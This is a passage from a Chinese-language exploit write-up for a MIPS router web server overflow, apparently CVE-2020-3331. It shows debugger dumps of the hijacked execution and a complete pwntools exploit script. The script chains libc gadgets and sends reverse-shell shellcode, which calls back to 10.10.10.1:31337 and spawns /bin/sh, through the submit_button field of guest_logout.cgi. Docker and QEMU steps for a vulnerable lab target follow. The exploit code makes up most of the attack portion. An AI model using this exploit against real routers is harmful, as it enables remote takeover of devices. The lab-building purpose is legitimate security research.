     S2   0x61616161 ('aaaa')
     S3   0x61616161 ('aaaa')
     S4   0x61616161 ('aaaa')
     S5   0x61616161 ('aaaa')
     S6   0x61616161 ('aaaa')
     S7   0x61616161 ('aaaa')
     S8   0x61616161 ('aaaa')
     FP   0x7fff1380 ?— 0x1802027
     SP   0x7fff1348 ?— 'aaaaaaaaaaaaaaaaaaaaaaaa'
     PC   0x77aa7058 (xdr_free+24) ?— jalr   $t9
    ───────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────
       0x77aa7050     move   $t9, $a0
       0x77aa7054     sw     $v0, 0x18($sp)
     ? 0x77aa7058     jalr   $t9
       0x77aa705c     addiu  $a0, $sp, 0x18
       0x77aa7060     lw     $gp, 0x10($sp)
       0x77aa7064     lw     $ra, 0x30($sp)
       0x77aa7068     jr     $ra
       0x77aa706c     addiu  $sp, $sp, 0x38
       0x77aa7070        jr     $ra
       0x77aa7074      addiu  $v0, $zero, 1
       0x77aa7078        lw     $v1, ($a0)
    ────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────
    00:0000│ sp     0x7fff1348 ?— 'aaaaaaaaaaaaaaaaaaaaaaaa'
    ... ↓
    06:0018│ a0 t9  0x7fff1360 ?— 0x0
    07:001c│        0x7fff1364 ?— 0x2804ffff
    ──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────
     ? f 0 77aa7058 xdr_free+24
    ──────────────────────────────────────────
    0x7fff1364 in ?? ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ──────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────
     V0   0x0
     V1   0x73
     A0   0x7fff1360 ?— 0x0
     A1   0x1
     A2   0x0
     A3   0x0
     T0   0xfd00
     T1   0x77a71411 ?— 0x6c5f5f00
     T2   0x77ee5f89 ?— jalx   0x79957c00
     T3   0x77ff5a60 —? 0x77a6a000 ?— 0x464c457f
     T4   0x77a6c64c ?— 0x88e
     T5   0x24
     T6   0xd80b684
     T7   0x77a70b7c ?— 0x4c475f00
     T8   0x77a6c40c ?— nop    
     T9   0x7fff1360 ?— 0x0
     S0   0x77aa7050 (xdr_free+16) ?— move   $t9, $a0
     S1   0x61616161 ('aaaa')
     S2   0x61616161 ('aaaa')
     S3   0x61616161 ('aaaa')
     S4   0x61616161 ('aaaa')
     S5   0x61616161 ('aaaa')
     S6   0x61616161 ('aaaa')
     S7   0x61616161 ('aaaa')
     S8   0x61616161 ('aaaa')
     FP   0x0
     SP   0x7fff1348 ?— 'aaaaaaaaaaaaaaaaaaaaaaaa'
     PC   0x7fff1364 ?— 0x2804ffff
    ───────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────
       0x7fff1360    nop    
     ? 0x7fff1364    slti   $a0, $zero, -1
        ↓
       0x7fff136c    syscall 0x42424
       0x7fff1370    slti   $a0, $zero, 0x1111
       0x7fff1374    addiu  $v0, $zero, 0xfa6
       0x7fff1378    syscall 0x42424
       0x7fff137c    addiu  $t4, $zero, -3
       0x7fff1380    not    $a0, $t4
       0x7fff1384    addiu  $v0, $zero, 0xfa6
       0x7fff1388    syscall 0x42424
       0x7fff138c    addiu  $t4, $zero, -3
    ────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────
    00:0000│ sp     0x7fff1348 ?— 'aaaaaaaaaaaaaaaaaaaaaaaa'
    ... ↓
    06:0018│ a0 t9  0x7fff1360 ?— 0x0
    07:001c│ pc     0x7fff1364 ?— 0x2804ffff
    ──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────
     ? f 0 7fff1364
成功执行shellcode，拿到shell
    #coding:UTF-8
    from pwn import *
    import thread,requests
    context(arch='mips',endian='little',os='linux', log_level='debug')
    io     = listen(31337)
    libc   = 0x77a6a000
    jmp_a0 = libc + 0x0003D050  # move  $t9,$a0             ; jalr  $a0
    jmp_s0 = libc + 0x000257A0  # addiu $a0,$sp,0x38+var_20 ; jalr  $s0 
    shellcode =  "slti $a0, $zero, 0xFFFF\n"
    shellcode +=  "slti $a0, $zero, 0xFFFF\n"
    shellcode +=  "li $v0, 4006\n"
    shellcode +=  "syscall 0x42424\n"
    shellcode +=  "slti $a0, $zero, 0x1111\n"
    shellcode +=  "li $v0, 4006\n"
    shellcode +=   "syscall 0x42424\n"
    shellcode +=   "li $t4, 0xFFFFFFFD\n" 
    shellcode +=   "not $a0, $t4\n"
    shellcode +=   "li $v0, 4006\n"
    shellcode +=   "syscall 0x42424\n"
    shellcode +=   "li $t4, 0xFFFFFFFD\n" 
    shellcode +=   "not $a0, $t4\n"
    shellcode +=    "not $a1, $t4\n"
    shellcode +=    "slti $a2, $zero, 0xFFFF\n"
    shellcode +=   "li $v0, 4183\n"
    shellcode +=     "syscall 0x42424\n"
    shellcode +=     "andi $a0, $v0, 0xFFFF\n"
    shellcode +=     "li $v0, 4041\n"
    shellcode +=     "syscall 0x42424\n"
    shellcode +=    "li $v0, 4041\n"
    shellcode +=    "syscall 0x42424\n"
    shellcode +=     "lui $a1, 0x6979\n"
    shellcode +=     "ori $a1, 0xFF01\n"
    shellcode +=     "addi $a1, $a1, 0x0101\n"
    shellcode +=     "sw $a1, -8($sp)\n"
    shellcode +=    "li $a1, 0x010A0A0A\n"   #这里是需要改的IP地址
    shellcode +=     "sw $a1, -4($sp)\n"
    shellcode +=     "addi $a1, $sp, -8\n"
    shellcode +=     "li $t4, 0xFFFFFFEF\n"
    shellcode +=     "not $a2, $t4\n"
    shellcode +=     "li $v0, 4170\n"
    shellcode +=     "syscall 0x42424\n"
    shellcode +=     "lui $t0, 0x6962\n"
    shellcode +=     "ori $t0, $t0,0x2f2f\n"
    shellcode +=      "sw $t0, -20($sp)\n"
    shellcode +=     "lui $t0, 0x6873\n"
    shellcode +=      "ori $t0, 0x2f6e\n"
    shellcode +=      "sw $t0, -16($sp)\n"
    shellcode +=      "slti $a3, $zero, 0xFFFF\n"
    shellcode +=      "sw $a3, -12($sp)\n"
    shellcode +=     "sw $a3, -4($sp)\n"
    shellcode +=     "addi $a0, $sp, -20\n"
    shellcode +=     "addi $t0, $sp, -20\n"
    shellcode +=      "sw $t0, -8($sp)\n"
    shellcode +=      "addi $a1, $sp, -8\n"
    shellcode +=      "addiu $sp, $sp, -20\n" 
    shellcode +=     "slti $a2, $zero, 0xFFFF\n"
    shellcode +=      "li $v0, 4011\n"
    shellcode +=     "syscall 0x42424" 
    shell = asm(shellcode)
    # 覆盖s0 覆盖ra 最后将shellcode写进sp+0x18的位置
    # 先jmp到s0在jmp到a0执行shellcode
    payload = "status_guestnet.asp"+'a'*49+p32(jmp_a0)+0x20*'a'+p32(jmp_s0)+0x18*'a'+shell  
    #payload = "status_guestnet.asp"+'a'*49+p32(0xdeadbeef)                                 
    paramsPost = {
                "cmac":"7a:29:9f:d3:d2:6e",
                "submit_button":payload,
                "cip":"192.168.1.1",
                }
    def attack():
        try: 
            requests.post("http://10.10.10.3/guest_logout.cgi", data=paramsPost, verify=False)
        except: 
            pass
    thread.start_new_thread(attack,())
    io.wait_for_connection()
    log.success("getshell")
    io.interactive()
    #10A0A0A -> 10.10.10.1 LSB
    #0x77aa7050 jalr $a0
    #0x77a8f7a0 jalr $s0
shellcode我是改的回连地址，然后利用pwntools把汇编转成二进制在打进去，算是在轩哥的exp上做了些改动，感兴趣的师傅可以自己去调一下。
## docker搭建固件靶场环境
最后的docker环境部署，其实大概的架构是这样的
将qemu_system里的端口映射到docker里面，在从docker端口转发到宿主机，然后外网就能访问到qemu_system里的服务了，因为要外网访问，所以我们不使用方便调试的tap模式，直接使用net模式，启动脚本如下：
    qemu-system-mipsel -M malta \
    -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mipsel_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0 nokalsr" \
    -device e1000,netdev=net0 \
    -netdev user,id=net0,hostfwd=tcp::80-:80,hostfwd=tcp::31337-:31337,hostfwd=tcp::1234-:1234 -nographic 
转发了三个端口，一个是httpd的80，回连的31337，gdb调试的1234。
然后在qemu里写好启动脚本
    #!/bin/sh
    chroot squashfs-root sh start.sh
    #!/bin/sh
    export LD_PRELOAD="./nvram.so" && ./httpd    //start.sh的内容
放到rc.local里面，就能自启动了。
在将文件提前保存进docker镜像里，然后写好dockerfile，打包上传至dockerhub即可
    FROM vulshare/cve-2020-3331:lxonz
    LABEL Author="lxonz"
    WORKDIR /home/root/qemu_system_mipsel
    CMD [ "/bin/sh", "-c", "chmod 755 qemu_mipsel.sh && sh qemu_mipsel.sh" ]
    EXPOSE 31137
    EXPOSE 80
    EXPOSE 1234
这里要写好转发的端口，最后通过-P参数启动。
最后呢，因为qemu里我转发了1234端口，但是docker里没转发，如果想要调试的师傅可以自己转发一下
## 参考链接
[1] 
[2] 
[3] 
* * *